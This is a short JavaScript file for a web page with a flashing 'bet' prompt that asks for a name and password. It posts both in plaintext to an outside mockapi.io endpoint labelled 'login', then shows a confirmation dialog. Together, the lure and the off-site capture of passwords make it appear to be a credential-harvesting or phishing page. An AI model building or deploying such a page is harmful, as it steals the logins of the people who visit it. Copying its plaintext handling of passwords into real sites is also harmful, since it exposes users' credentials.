let color = "purple";
let betStat = false;
setInterval(() => {
    if (color === "purple") {
        document.getElementById("text").style.backgroundColor = "green"
        document.getElementById("text").style.boxShadow = "3px 3px 100px green"
        color = "green";
    } else if (color === "green") {
        document.getElementById("text").style.backgroundColor = "rgb(54, 14, 54)"
        document.getElementById("text").style.boxShadow = "3px 3px 100px rgb(3, 3, 3)"
        color = "purple"
    }
}, 300);

function bet() {
    if (betStat == false) {
        document.getElementById("pariez").showModal()
        betStat = true;
    } else {
        document.getElementById("alreadyDone").showModal()
    }
}

function submit() {
    let name = document.getElementById("name")
    let pass = document.getElementById("pass")
    if (name.value === "" || pass.value === "") {
        name.value = ""
        name.style.border = "solid red"
        pass.value = ""
        pass.style.border = "solid red"
        setTimeout(() => {
            pass.style.border = "none"
            name.style.border = "none"
        }, 1000);
    } else {

        fetch('https://68147b4b225ff1af1628f9c4.mockapi.io/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    data: `Name:${name.value} pass:${pass.value}`
                })
            })
            .then(res => res.json())
            .then(data => {
                console.log(data);

                // Show a modal if it's a <dialog> element
                const modal = document.getElementById("submit");
                if (modal && typeof modal.showModal === 'function') {
                    modal.showModal();
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });


    }
}